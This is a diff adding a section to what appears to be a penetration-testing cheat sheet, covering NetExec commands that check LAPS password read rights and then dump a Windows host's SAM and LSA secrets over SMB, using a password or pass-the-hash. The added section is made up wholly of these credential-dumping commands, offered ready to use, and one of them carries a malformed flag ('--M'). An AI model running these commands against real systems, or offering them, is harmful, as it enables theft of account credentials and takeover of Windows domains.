@@ -496,6 +496,26 @@ grep -i <keyword> *
 </details> 
 
 <details>
+  <summary> NetExec dump with ReadLAPSPassword rights </summary> 
+
+  ### Check if the user can read LAPS
+  ```bash
+  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M laps
+  ```
+  
+  ### Dump SAM 
+  ```bash
+  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M laps --sam
+  ```
+  
+  ### Dump LSA 
+  ```bash
+  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --M laps --lsa
+  ```
+  
+</details> 
+
+<details>
   <summary> linWinPwn </summary> 
   
 ### With administrator Account (using password, NTLM hash or Kerberos ticket)
